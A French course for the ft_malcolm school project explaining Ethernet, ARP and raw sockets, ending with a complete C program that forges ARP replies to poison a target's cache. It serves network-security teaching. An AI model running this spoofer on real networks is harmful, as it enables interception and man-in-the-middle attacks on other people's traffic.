# ft_malcolm — Cours complet
## ARP Spoofing : théorie, protocoles et implémentation en C

---

## Table des matières

1. [Le modèle en couches](#1-le-modèle-en-couches)
2. [La couche Ethernet](#2-la-couche-ethernet)
3. [Le protocole ARP](#3-le-protocole-arp)
4. [La table ARP et son exploitation](#4-la-table-arp-et-son-exploitation)
5. [L'attaque ARP Spoofing](#5-lattaque-arp-spoofing)
6. [Les raw sockets en C](#6-les-raw-sockets-en-c)
7. [Structure d'un paquet ARP en mémoire](#7-structure-dun-paquet-arp-en-mémoire)
8. [Fonctions C nécessaires](#8-fonctions-c-nécessaires)
9. [Exemple de programme minimal](#9-exemple-de-programme-minimal)
10. [Checklist avant de coder](#10-checklist-avant-de-coder)

---

## 1. Le modèle en couches

### Pourquoi des couches ?

Un réseau informatique est un problème complexe. Pour le rendre gérable, on le découpe en couches, chacune ayant une responsabilité précise. C'est comme envoyer une lettre : tu écris le contenu (couche application), tu la mets dans une enveloppe avec une adresse (couche transport/réseau), et le facteur se charge de la livraison physique (couche liaison).

Le modèle utilisé en pratique sur Internet est le **modèle TCP/IP** à 4 couches :

```
┌─────────────────────────────────────────────┐
│           COUCHE APPLICATION                │
│   HTTP, FTP, SSH, DNS...                    │
│   "Quel contenu est-ce que j'envoie ?"      │
├─────────────────────────────────────────────┤
│           COUCHE TRANSPORT                  │
│   TCP, UDP                                  │
│   "À quel port ? Fiable ou pas ?"           │
├─────────────────────────────────────────────┤
│           COUCHE RÉSEAU (IP)                │
│   IPv4, IPv6, ICMP                          │
│   "Quelle IP source ? Quelle IP destination?"│
├─────────────────────────────────────────────┤
│           COUCHE LIAISON (Ethernet)         │
│   Ethernet, Wi-Fi, ARP                      │
│   "Quelle carte réseau ? Quelle MAC ?"      │
└─────────────────────────────────────────────┘
              ↕  câble ou Wi-Fi
```

### Comment les couches communiquent entre elles

Quand tu envoies un paquet HTTP, voilà ce qui se passe en réalité :

```
[Données HTTP]
      ↓  encapsulé dans
[En-tête TCP | Données HTTP]
      ↓  encapsulé dans
[En-tête IP | En-tête TCP | Données HTTP]
      ↓  encapsulé dans
[En-tête Ethernet | En-tête IP | En-tête TCP | Données HTTP | FCS]
      ↓  envoyé sur le câble
```

Chaque couche **enveloppe** le paquet de la couche au-dessus en ajoutant son propre en-tête.

### Où se situe ARP ?

ARP est particulier : il vit **entre la couche Ethernet et la couche IP**. Son rôle est précisément de faire le lien entre ces deux mondes — traduire une IP en MAC.

```
┌──────────────────────────────────────────┐
│              IP (couche 3)               │
├──────────────────────────────────────────┤
│    ARP ← ici, entre les deux couches     │
├──────────────────────────────────────────┤
│           Ethernet (couche 2)            │
└──────────────────────────────────────────┘
```

Un paquet ARP **n'a pas d'en-tête IP**. Il voyage directement dans une trame Ethernet.

---

## 2. La couche Ethernet

### L'adresse MAC

Chaque carte réseau (NIC — Network Interface Card) possède une adresse MAC (**Media Access Control**) unique au monde, gravée en usine.

- Format : `aa:bb:cc:dd:ee:ff` (6 octets en hexadécimal)
- Exemple : `08:00:27:4a:b3:c1`
- Les 3 premiers octets identifient le fabricant (OUI — Organizationally Unique Identifier)
- Les 3 derniers sont le numéro de série de la carte

**Adresse spéciale : `ff:ff:ff:ff:ff:ff`**
C'est l'adresse de broadcast Ethernet. Toutes les cartes réseau du réseau local acceptent les trames dont la MAC de destination est `ff:ff:ff:ff:ff:ff`.

### Structure d'une trame Ethernet

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├───────────────────────────────────────────────────────────────────┤
│                   MAC Destination (6 octets)                      │
│              ff:ff:ff:ff:ff:ff pour le broadcast                  │
├───────────────────────────────────────────────────────────────────┤
│                   MAC Source (6 octets)                           │
│              ta propre adresse MAC                                │
├───────────────────┬───────────────────────────────────────────────┤
│  EtherType (2o)   │            Données (payload)                  │
│  0x0806 = ARP     │            46 à 1500 octets                   │
│  0x0800 = IPv4    │                                               │
├───────────────────┴───────────────────────────────────────────────┤
│                   FCS - Checksum (4 octets)                       │
│                   (géré par le matériel)                          │
└───────────────────────────────────────────────────────────────────┘
```

Le champ **EtherType** est crucial : il indique ce que contient le payload. `0x0806` signifie que le contenu est un paquet ARP. C'est ce champ que le noyau Linux utilise pour router le paquet vers le bon handler.

---

## 3. Le protocole ARP

### Le problème qu'ARP résout

Sur un réseau local, les données voyagent via Ethernet. Pour envoyer une trame Ethernet, tu as besoin de la **MAC de destination**. Mais les applications connaissent les IPs, pas les MACs.

**Problème :** Comment trouver la MAC qui correspond à une IP ?
**Solution :** ARP (Address Resolution Protocol — RFC 826, 1982)

### Mécanisme détaillé

```
Machine A (192.168.1.10)                    Machine B (192.168.1.20)
MAC: aa:aa:aa:aa:aa                         MAC: bb:bb:bb:bb:bb:bb
        │                                           │
        │   ① ARP Request (broadcast)              │
        │   Ethernet: src=aa:aa, dst=ff:ff:ff:ff:ff:ff
        │   ARP: "Qui a 192.168.1.20 ?            │
        │         Répondez à aa:aa:aa:aa:aa:aa"   │
        │──────────────────────────────────────────▶│
        │                          ┌────────────────┘
        │                          │ B reconnaît son IP
        │                          │ B mémorise A dans sa table ARP
        │   ② ARP Reply (unicast)  │
        │   Ethernet: src=bb:bb, dst=aa:aa         │
        │   ARP: "192.168.1.20 est à bb:bb:bb:bb:bb:bb"
        │◀──────────────────────────────────────────│
        │                                           │
A mémorise B dans sa table ARP
A peut maintenant envoyer des trames Ethernet à B
```

### Structure d'un paquet ARP

C'est ce que tu vas construire byte par byte en C. Voici la structure complète :

```
 Octets  Champ               Description
 ─────── ──────────────────  ─────────────────────────────────────────
  0-1    Hardware Type       Type de réseau physique
                             0x0001 = Ethernet
  2-3    Protocol Type       Type de protocole réseau
                             0x0800 = IPv4
  4      Hardware Addr Len   Longueur d'une adresse MAC
                             0x06 = 6 octets
  5      Protocol Addr Len   Longueur d'une adresse IP
                             0x04 = 4 octets
  6-7    Operation           Type d'opération
                             0x0001 = Request (requête)
                             0x0002 = Reply (réponse)
  8-13   Sender MAC          MAC de l'expéditeur (6 octets)
 14-17   Sender IP           IP de l'expéditeur (4 octets)
 18-23   Target MAC          MAC du destinataire (6 octets)
                             ff:ff:ff:ff:ff:ff dans une requête
 24-27   Target IP           IP du destinataire (4 octets)
```

**Représentation visuelle :**

```
┌──────────┬──────────┬────────┬────────┬──────────┐
│ HW Type  │ Proto    │ HW len │ PR len │ Opcode   │
│ 0x0001   │ 0x0800   │ 0x06   │ 0x04   │ 0x0001   │
│ (2 octets│ (2 octets│(1 octet│(1 octet│ (2 octets│
├──────────┴──────────┴────────┴────────┴──────────┤
│              Sender MAC (6 octets)               │
│         aa:bb:cc:dd:ee:ff                        │
├──────────────────────────────────────────────────┤
│              Sender IP (4 octets)                │
│         192.168.1.10                             │
├──────────────────────────────────────────────────┤
│              Target MAC (6 octets)               │
│         00:00:00:00:00:00 (requête)              │
│         ou ff:ff:ff:ff:ff:ff (broadcast)         │
├──────────────────────────────────────────────────┤
│              Target IP (4 octets)                │
│         192.168.1.20                             │
└──────────────────────────────────────────────────┘
         Total : 28 octets
```

### Comparaison Request vs Reply

```
                    ARP REQUEST              ARP REPLY
                    ──────────────────────   ─────────────────────────
Ethernet dst    →   ff:ff:ff:ff:ff:ff        aa:aa:aa:aa:aa:aa (cible)
Ethernet src    →   aa:aa:aa:aa:aa:aa        bb:bb:bb:bb:bb:bb
Opcode          →   0x0001                   0x0002
Sender MAC      →   aa:aa:aa:aa:aa:aa        bb:bb:bb:bb:bb:bb
Sender IP       →   192.168.1.10             192.168.1.20
Target MAC      →   00:00:00:00:00:00        aa:aa:aa:aa:aa:aa
Target IP       →   192.168.1.20             192.168.1.10
```

---

## 4. La table ARP et son exploitation

### La table ARP (ARP cache)

Chaque machine maintient une table ARP en mémoire pour éviter de faire une requête à chaque paquet. C'est un simple mapping IP → MAC avec un TTL (durée de vie).

Sur Linux, tu peux la voir avec :
```bash
arp -n
# ou
ip neigh show
```

Exemple de sortie :
```
192.168.1.1   dev eth0  lladdr  aa:bb:cc:dd:ee:ff  REACHABLE
192.168.1.20  dev eth0  lladdr  bb:cc:dd:ee:ff:00  STALE
```

### La faille fondamentale d'ARP

ARP est un protocole **sans état** et **sans authentification** :

1. Une machine accepte une réponse ARP **même si elle n'a pas fait de requête**
2. Il n'y a **aucune vérification** que l'expéditeur est bien propriétaire de l'IP qu'il annonce
3. La dernière réponse reçue **écrase** l'entrée précédente dans la table

C'est cette naïveté qui rend l'ARP spoofing possible.

### Conséquences concrètes

Si tu parviens à convaincre une machine que tu es quelqu'un d'autre, **tout son trafic destiné à cette IP passe par toi** :

```
Sans attaque :      Cible ──────────────────▶ Routeur
                    (via MAC réelle du routeur)

Avec ARP spoofing : Cible ──────▶ Attaquant ──▶ Routeur
                    (croit envoyer au routeur,
                     mais envoie à l'attaquant)
```

C'est le **Man in the Middle** (MitM) : tu interceptes tout le trafic.

---

## 5. L'attaque ARP Spoofing

### Ce que ft_malcolm doit faire

ft_malcolm reçoit 4 arguments :
```
./ft_malcolm <IP source> <MAC source> <IP cible> <MAC cible>
```

- **IP source / MAC source** : l'identité que tu vas usurper (ce que tu vas "prétendre être")
- **IP cible / MAC cible** : la machine à qui tu vas envoyer la fausse réponse

Le programme doit :
1. Ouvrir un raw socket pour écouter le réseau
2. Attendre de voir passer une requête ARP broadcast demandant l'IP source
3. Forger une réponse ARP qui dit : "l'IP source est à la MAC de l'attaquant"
4. Envoyer cette réponse à la cible

### Déroulement de l'attaque

```
Cible (192.168.1.10)     ft_malcolm                  Routeur (192.168.1.1)
MAC: cc:cc:cc:cc:cc:cc   MAC: dd:dd:dd:dd:dd:dd      MAC: aa:bb:cc:dd:ee:ff
        │                       │                           │
        │  ① ARP Request        │                           │
        │  "Qui a .1.1 ?"       │                           │
        │  dst: ff:ff:ff:ff:ff  │                           │
        │───────────────────────▶ (intercepté)              │
        │                       │  aussi reçu par           │
        │                       │  le routeur ──────────────▶
        │                       │  (mais ft_malcolm répond plus vite)
        │  ② Fausse ARP Reply   │
        │  "192.168.1.1 c'est   │
        │   dd:dd:dd:dd:dd:dd"  │
        │◀──────────────────────│
        │                       │
Table ARP cible empoisonnée :
192.168.1.1 → dd:dd:dd:dd:dd:dd  ← FAUX (c'est la MAC de l'attaquant)

        │  ③ Paquet IP          │
        │  dst IP: 192.168.1.1  │
        │  dst MAC: dd:dd:dd:dd │  ← va à l'attaquant, pas au routeur !
        │───────────────────────▶
```

### Points critiques à comprendre

**Pourquoi attendre la requête ?**
Tu pourrais envoyer une réponse ARP gratuite (Gratuitous ARP) sans attendre — certains OS les acceptent. Mais le sujet ft_malcolm demande spécifiquement d'attendre et de répondre à une vraie requête.

**La course à la réponse**
Si le vrai propriétaire de l'IP répond avant toi, la cible aura la bonne entrée. En pratique ton programme tourne en boucle pour répoisonner la table régulièrement.

**Niveau 2 uniquement**
Tout ça se passe au niveau Ethernet. IP n'est pas impliqué dans l'attaque elle-même.

---

## 6. Les raw sockets en C

### Pourquoi pas un socket classique ?

```
Socket TCP/UDP classique :
  socket(AF_INET, SOCK_STREAM, 0)
  → Voit uniquement les paquets destinés à TON IP + TON PORT
  → L'OS gère les en-têtes IP et TCP
  → Impossible d'envoyer/recevoir de l'ARP

Raw socket (niveau Ethernet) :
  socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
  → Voit TOUTES les trames Ethernet qui passent sur l'interface
  → Tu construis toi-même les en-têtes
  → Tu peux envoyer et recevoir de l'ARP
```

**Comparaison :**

```
Couche Application  │  [ton programme]        [ton programme]
                    │       ↕                      ↕
Couche Transport    │  TCP / UDP              (bypassed)
                    │       ↕                      ↕
Couche Réseau (IP)  │  IP header              (bypassed)
                    │       ↕                      ↕
Couche Ethernet     │  Ethernet header        Ethernet header  ← raw socket
                    │       ↕                      ↕
Réseau physique     │  ══════════════════════════════════════
                         Socket classique        Raw socket
```

### Créer un raw socket

```c
int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
```

- `AF_PACKET` : famille d'adresses pour les raw sockets niveau Ethernet (Linux)
- `SOCK_RAW` : accès brut aux paquets
- `htons(ETH_P_ARP)` : on veut uniquement les trames ARP (EtherType 0x0806)
  - Utilise `htons(ETH_P_ALL)` pour tout recevoir

> **Note :** Les raw sockets nécessitent les **droits root** (ou la capability `CAP_NET_RAW`).

### Identifier l'interface réseau

Pour envoyer une trame, il faut savoir sur quelle interface réseau travailler (eth0, ens33, etc.) et connaître son index.

```c
struct ifreq ifr;
strncpy(ifr.ifr_name, "eth0", IFNAMSIZ);
ioctl(sockfd, SIOCGIFINDEX, &ifr);
int if_index = ifr.ifr_ifindex;
```

Tu utilises aussi `ioctl` pour récupérer ta propre MAC :
```c
ioctl(sockfd, SIOCGIFHWADDR, &ifr);
unsigned char *my_mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
```

### Recevoir des trames

```c
unsigned char buffer[65536];
struct sockaddr_ll src_addr;
socklen_t addr_len = sizeof(src_addr);

int n = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                 (struct sockaddr *)&src_addr, &addr_len);
```

Le buffer contient la trame Ethernet **complète** : en-tête Ethernet + payload ARP.

### Envoyer une trame

```c
struct sockaddr_ll dest_addr;
memset(&dest_addr, 0, sizeof(dest_addr));
dest_addr.sll_family   = AF_PACKET;
dest_addr.sll_ifindex  = if_index;
dest_addr.sll_halen    = ETH_ALEN;
memcpy(dest_addr.sll_addr, target_mac, 6);

sendto(sockfd, packet, packet_len, 0,
       (struct sockaddr *)&dest_addr, sizeof(dest_addr));
```

---

## 7. Structure d'un paquet ARP en mémoire

### Les structures C disponibles dans `<net/ethernet.h>` et `<net/if_arp.h>`

**En-tête Ethernet (`struct ethhdr`) :**
```c
#include <net/ethernet.h>

struct ethhdr {
    unsigned char  h_dest[ETH_ALEN];    // MAC destination (6 octets)
    unsigned char  h_source[ETH_ALEN];  // MAC source (6 octets)
    __be16         h_proto;             // EtherType (ex: ETH_P_ARP = 0x0806)
};
// Taille : 14 octets
```

**Paquet ARP (`struct arphdr` + données) :**
```c
#include <net/if_arp.h>

struct arphdr {
    __be16  ar_hrd;   // Hardware type (ARPHRD_ETHER = 1)
    __be16  ar_pro;   // Protocol type (ETH_P_IP = 0x0800)
    __u8    ar_hln;   // Hardware address length (6 pour MAC)
    __u8    ar_pln;   // Protocol address length (4 pour IPv4)
    __be16  ar_op;    // Opcode (ARPOP_REQUEST=1, ARPOP_REPLY=2)
};
// Taille : 8 octets
// Suivi de : Sender MAC (6) + Sender IP (4) + Target MAC (6) + Target IP (4)
```

### Construire le paquet complet

En pratique, tu crées souvent une struct custom qui regroupe tout :

```c
// Structure complète d'un paquet ARP Ethernet
struct arp_packet {
    // === En-tête Ethernet (14 octets) ===
    uint8_t  eth_dst[6];    // MAC destination
    uint8_t  eth_src[6];    // MAC source
    uint16_t eth_type;      // 0x0806 pour ARP

    // === En-tête ARP (8 octets) ===
    uint16_t hw_type;       // 0x0001 pour Ethernet
    uint16_t proto_type;    // 0x0800 pour IPv4
    uint8_t  hw_len;        // 6 (longueur MAC)
    uint8_t  proto_len;     // 4 (longueur IPv4)
    uint16_t opcode;        // 1=request, 2=reply

    // === Données ARP (20 octets) ===
    uint8_t  sender_mac[6]; // MAC de l'expéditeur
    uint8_t  sender_ip[4];  // IP de l'expéditeur
    uint8_t  target_mac[6]; // MAC du destinataire
    uint8_t  target_ip[4];  // IP du destinataire
} __attribute__((packed));  // IMPORTANT : pas de padding !
// Taille totale : 42 octets
```

> **`__attribute__((packed))` est essentiel.** Sans lui, le compilateur peut ajouter des octets de padding entre les champs pour aligner la mémoire. Le paquet réseau ne connaît pas ce padding — il serait corrompu.

### Attention au byte order (endianness)

Le réseau utilise le **big-endian** (octet de poids fort en premier).
Les processeurs x86 utilisent le **little-endian** (octet de poids faible en premier).

Il faut toujours convertir les entiers 16 et 32 bits avant de les mettre dans un paquet :

```
Valeur 0x0806 (EtherType ARP) :

En mémoire little-endian (x86) :  06 08  ← FAUX pour le réseau
En mémoire big-endian (réseau) :   08 06  ← CORRECT

Solution : htons(0x0806) convertit automatiquement
```

| Fonction | Sens | Usage |
|----------|------|-------|
| `htons()` | Host → Network (16 bits) | EtherType, opcode ARP |
| `htonl()` | Host → Network (32 bits) | Adresses IP en entier |
| `ntohs()` | Network → Host (16 bits) | Lire un opcode reçu |
| `ntohl()` | Network → Host (32 bits) | Lire une IP reçue |

> **Les adresses MAC et IP en tableau d'octets** (`uint8_t[6]`, `uint8_t[4]`) n'ont pas besoin de conversion — elles sont déjà byte par byte.

---

## 8. Fonctions C nécessaires

### Headers à inclure

```c
#include <stdio.h>           // printf, perror
#include <stdlib.h>          // exit
#include <string.h>          // memset, memcpy, strncpy
#include <unistd.h>          // close
#include <errno.h>           // errno

#include <sys/socket.h>      // socket, sendto, recvfrom, bind
#include <sys/ioctl.h>       // ioctl
#include <arpa/inet.h>       // inet_pton, inet_ntop, htons, htonl
#include <net/ethernet.h>    // struct ethhdr, ETH_P_ARP, ETH_ALEN
#include <net/if.h>          // struct ifreq, IFNAMSIZ
#include <net/if_arp.h>      // struct arphdr, ARPOP_REQUEST, ARPOP_REPLY
#include <netpacket/packet.h>// struct sockaddr_ll, AF_PACKET
#include <linux/if_ether.h>  // ETH_P_ALL, ETH_P_ARP, ETH_P_IP
```

### Fonctions essentielles

#### `socket()` — Créer un socket

```c
int socket(int domain, int type, int protocol);

// Usage pour ft_malcolm :
int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
if (sockfd < 0) {
    perror("socket");
    exit(1);
}
```

| Paramètre | Valeur | Description |
|-----------|--------|-------------|
| `domain` | `AF_PACKET` | Famille pour raw sockets niveau Ethernet |
| `type` | `SOCK_RAW` | Accès brut aux paquets |
| `protocol` | `htons(ETH_P_ARP)` | Filtrer uniquement les trames ARP |

---

#### `ioctl()` — Contrôler une interface réseau

```c
int ioctl(int sockfd, unsigned long request, void *argp);

// Récupérer l'index de l'interface réseau :
struct ifreq ifr;
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
    perror("ioctl SIOCGIFINDEX");
    exit(1);
}
int if_index = ifr.ifr_ifindex;

// Récupérer ta propre adresse MAC :
if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
    perror("ioctl SIOCGIFHWADDR");
    exit(1);
}
unsigned char my_mac[6];
memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
```

| Request | Description |
|---------|-------------|
| `SIOCGIFINDEX` | Obtenir l'index d'une interface |
| `SIOCGIFHWADDR` | Obtenir la MAC d'une interface |
| `SIOCGIFADDR` | Obtenir l'IP d'une interface |

---

#### `recvfrom()` — Recevoir une trame

```c
ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
                 struct sockaddr *src_addr, socklen_t *addrlen);

// Usage :
unsigned char buffer[65536];
struct sockaddr_ll src_addr;
socklen_t addr_len = sizeof(src_addr);

while (1) {
    int n = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                     (struct sockaddr *)&src_addr, &addr_len);
    if (n < 0) {
        perror("recvfrom");
        break;
    }
    // buffer contient la trame Ethernet complète
    // Parse l'en-tête Ethernet :
    struct ethhdr *eth = (struct ethhdr *)buffer;
    // Parse l'en-tête ARP (juste après l'en-tête Ethernet) :
    struct arphdr *arp = (struct arphdr *)(buffer + sizeof(struct ethhdr));
}
```

> **`recvfrom()` est bloquant par défaut.** Le programme attend qu'une trame arrive avant de continuer.

---

#### `sendto()` — Envoyer une trame

```c
ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,
               const struct sockaddr *dest_addr, socklen_t addrlen);

// Usage :
struct sockaddr_ll dest;
memset(&dest, 0, sizeof(dest));
dest.sll_family  = AF_PACKET;
dest.sll_ifindex = if_index;           // Index de l'interface
dest.sll_halen   = ETH_ALEN;           // Longueur de la MAC (6)
memcpy(dest.sll_addr, target_mac, 6);  // MAC du destinataire

if (sendto(sockfd, &packet, sizeof(packet), 0,
           (struct sockaddr *)&dest, sizeof(dest)) < 0) {
    perror("sendto");
}
```

---

#### `inet_pton()` — Convertir une IP string → binaire

```c
int inet_pton(int af, const char *src, void *dst);

// Convertir "192.168.1.10" en 4 octets :
uint8_t ip[4];
if (inet_pton(AF_INET, "192.168.1.10", ip) != 1) {
    fprintf(stderr, "Adresse IP invalide\n");
    exit(1);
}
// ip[0]=192, ip[1]=168, ip[2]=1, ip[3]=10
```

---

#### `inet_ntop()` — Convertir une IP binaire → string

```c
const char *inet_ntop(int af, const void *src, char *dst, socklen_t size);

// Afficher une IP binaire :
char ip_str[INET_ADDRSTRLEN];
inet_ntop(AF_INET, ip_bytes, ip_str, INET_ADDRSTRLEN);
printf("IP: %s\n", ip_str);
```

---

#### Parser une adresse MAC depuis une string

Il n'y a pas de fonction standard pour ça. Tu dois la parser manuellement :

```c
// Convertir "aa:bb:cc:dd:ee:ff" en tableau d'octets
int parse_mac(const char *str, uint8_t mac[6]) {
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2],
                  &mac[3], &mac[4], &mac[5]) == 6 ? 0 : -1;
}
```

---

#### `memcpy()` et `memset()` — Manipulation mémoire

```c
// Remplir un buffer de zéros :
memset(&packet, 0, sizeof(packet));

// Copier une MAC :
memcpy(packet.eth_dst, target_mac, 6);

// Copier une IP :
memcpy(packet.sender_ip, sender_ip, 4);
```

---

#### `close()` — Fermer le socket

```c
close(sockfd);
```

Toujours fermer le socket proprement, notamment dans le handler de signal (Ctrl+C).

---

#### Gestion des signaux

```c
#include <signal.h>

int g_running = 1;

void handle_sigint(int sig) {
    (void)sig;
    g_running = 0;
}

// Dans main() :
signal(SIGINT, handle_sigint);

// Dans la boucle :
while (g_running) {
    // recvfrom...
}
close(sockfd);
```

---

### Tableau récapitulatif des fonctions

| Fonction | Header | Rôle dans ft_malcolm |
|----------|--------|---------------------|
| `socket()` | `sys/socket.h` | Créer le raw socket |
| `ioctl()` | `sys/ioctl.h` | Récupérer index et MAC de l'interface |
| `recvfrom()` | `sys/socket.h` | Recevoir les trames ARP |
| `sendto()` | `sys/socket.h` | Envoyer la fausse réponse ARP |
| `inet_pton()` | `arpa/inet.h` | Convertir IP string → binaire |
| `inet_ntop()` | `arpa/inet.h` | Afficher une IP binaire |
| `htons()` | `arpa/inet.h` | Convertir 16 bits host → network |
| `htonl()` | `arpa/inet.h` | Convertir 32 bits host → network |
| `ntohs()` | `arpa/inet.h` | Convertir 16 bits network → host |
| `memset()` | `string.h` | Initialiser un buffer à zéro |
| `memcpy()` | `string.h` | Copier des octets (MAC, IP) |
| `sscanf()` | `stdio.h` | Parser une adresse MAC |
| `signal()` | `signal.h` | Gérer Ctrl+C proprement |
| `close()` | `unistd.h` | Fermer le socket |

---

## 9. Exemple de programme minimal

Voici le squelette d'un ft_malcolm minimal pour te donner la structure générale. Ce n'est **pas** la solution complète — les détails restent à implémenter.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>

// Taille totale d'une trame ARP : Ethernet (14) + ARP (28) = 42 octets
#define ARP_PACKET_SIZE 42

// Struct custom pour représenter un paquet ARP complet
struct arp_packet {
    // En-tête Ethernet
    uint8_t  eth_dst[6];
    uint8_t  eth_src[6];
    uint16_t eth_type;
    // En-tête ARP
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t  hw_len;
    uint8_t  proto_len;
    uint16_t opcode;
    // Données ARP
    uint8_t  sender_mac[6];
    uint8_t  sender_ip[4];
    uint8_t  target_mac[6];
    uint8_t  target_ip[4];
} __attribute__((packed));

static int g_running = 1;

void handle_signal(int sig) {
    (void)sig;
    g_running = 0;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <src_ip> <src_mac> <dst_ip> <dst_mac>\n", argv[0]);
        return 1;
    }

    // 1. Créer le raw socket
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    // 2. Récupérer l'index de l'interface (ex: eth0)
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
    ioctl(sockfd, SIOCGIFINDEX, &ifr);
    int if_index = ifr.ifr_ifindex;

    // 3. Récupérer ma propre MAC
    ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    uint8_t my_mac[6];
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);

    // 4. Parser les arguments
    uint8_t src_ip[4], src_mac[6], dst_ip[4], dst_mac[6];
    inet_pton(AF_INET, argv[1], src_ip);
    sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &src_mac[0], &src_mac[1], &src_mac[2],
           &src_mac[3], &src_mac[4], &src_mac[5]);
    inet_pton(AF_INET, argv[3], dst_ip);
    sscanf(argv[4], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &dst_mac[0], &dst_mac[1], &dst_mac[2],
           &dst_mac[3], &dst_mac[4], &dst_mac[5]);

    signal(SIGINT, handle_signal);

    // 5. Boucle principale
    unsigned char buffer[65536];
    struct sockaddr_ll src_addr;
    socklen_t addr_len = sizeof(src_addr);

    printf("[*] En écoute sur eth0... (Ctrl+C pour arrêter)\n");

    while (g_running) {
        int n = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                         (struct sockaddr *)&src_addr, &addr_len);
        if (n < 0)
            break;

        // 6. Analyser la trame reçue
        struct ethhdr *eth = (struct ethhdr *)buffer;
        struct arphdr *arp = (struct arphdr *)(buffer + sizeof(struct ethhdr));

        // Vérifier que c'est bien une requête ARP (opcode 1)
        if (ntohs(arp->ar_op) != ARPOP_REQUEST)
            continue;

        // Les données ARP suivent le header arphdr :
        uint8_t *arp_data = (uint8_t *)(arp + 1);
        // uint8_t *req_sender_mac = arp_data;        // +0
        // uint8_t *req_sender_ip  = arp_data + 6;    // +6
        // uint8_t *req_target_mac = arp_data + 10;   // +10
        uint8_t *req_target_ip  = arp_data + 16;   // +16

        // Vérifier que la requête cherche bien notre src_ip
        if (memcmp(req_target_ip, src_ip, 4) != 0)
            continue;

        printf("[+] Requête ARP détectée ! Envoi de la réponse forgée...\n");

        // 7. Construire la fausse réponse ARP
        struct arp_packet reply;
        memset(&reply, 0, sizeof(reply));

        // En-tête Ethernet
        memcpy(reply.eth_dst, dst_mac, 6);   // Envoyer à la cible
        memcpy(reply.eth_src, my_mac, 6);    // Notre MAC comme source Ethernet
        reply.eth_type = htons(ETH_P_ARP);

        // En-tête ARP
        reply.hw_type    = htons(ARPHRD_ETHER);
        reply.proto_type = htons(ETH_P_IP);
        reply.hw_len     = 6;
        reply.proto_len  = 4;
        reply.opcode     = htons(ARPOP_REPLY);

        // Données ARP : on se fait passer pour src_ip avec notre MAC
        memcpy(reply.sender_mac, my_mac, 6); // Notre MAC → on usurpe src_ip
        memcpy(reply.sender_ip,  src_ip, 4); // L'IP qu'on usurpe
        memcpy(reply.target_mac, dst_mac, 6);// MAC de la cible
        memcpy(reply.target_ip,  dst_ip, 4); // IP de la cible

        // 8. Envoyer la réponse
        struct sockaddr_ll dest;
        memset(&dest, 0, sizeof(dest));
        dest.sll_family  = AF_PACKET;
        dest.sll_ifindex = if_index;
        dest.sll_halen   = ETH_ALEN;
        memcpy(dest.sll_addr, dst_mac, 6);

        sendto(sockfd, &reply, sizeof(reply), 0,
               (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sockfd);
    printf("\n[*] Terminé.\n");
    return 0;
}
```

---

## 10. Checklist avant de coder

Avant d'écrire ta première ligne, assure-toi de pouvoir répondre à ces questions. Si tu bloques sur l'une d'elles, relis la section correspondante.

### Théorie réseau
- [ ] Je sais expliquer la différence entre une adresse IP et une adresse MAC
- [ ] Je comprends le rôle de chaque couche du modèle TCP/IP
- [ ] Je sais ce qu'est une trame Ethernet et ce que contient son en-tête
- [ ] Je sais ce qu'est le broadcast Ethernet (`ff:ff:ff:ff:ff:ff`)
- [ ] Je comprends le champ EtherType et sais que ARP = `0x0806`

### Protocole ARP
- [ ] Je sais pourquoi ARP existe (le problème IP → MAC)
- [ ] Je comprends la différence entre ARP Request et ARP Reply
- [ ] Je connais les 8 champs d'un paquet ARP (hw_type, proto_type, hw_len, proto_len, opcode, sender_mac, sender_ip, target_ip)
- [ ] Je sais ce qu'est la table ARP et comment la consulter (`arp -n`)
- [ ] Je comprends pourquoi ARP est vulnérable (sans authentification, sans état)

### Raw sockets en C
- [ ] Je comprends pourquoi un socket TCP/UDP ne suffit pas pour ARP
- [ ] Je sais créer un raw socket avec `socket(AF_PACKET, SOCK_RAW, ...)`
- [ ] Je sais utiliser `ioctl` pour récupérer l'index et la MAC d'une interface
- [ ] Je sais recevoir une trame brute avec `recvfrom()`
- [ ] Je sais envoyer une trame brute avec `sendto()` et `struct sockaddr_ll`
- [ ] Je comprends pourquoi `__attribute__((packed))` est nécessaire
- [ ] Je comprends le problème d'endianness et sais utiliser `htons()` / `ntohs()`

### Implémentation ft_malcolm
- [ ] Je sais parser une IP string → binaire avec `inet_pton()`
- [ ] Je sais parser une MAC string → binaire avec `sscanf()`
- [ ] Je sais identifier une requête ARP dans une trame reçue
- [ ] Je sais construire une fausse réponse ARP byte par byte
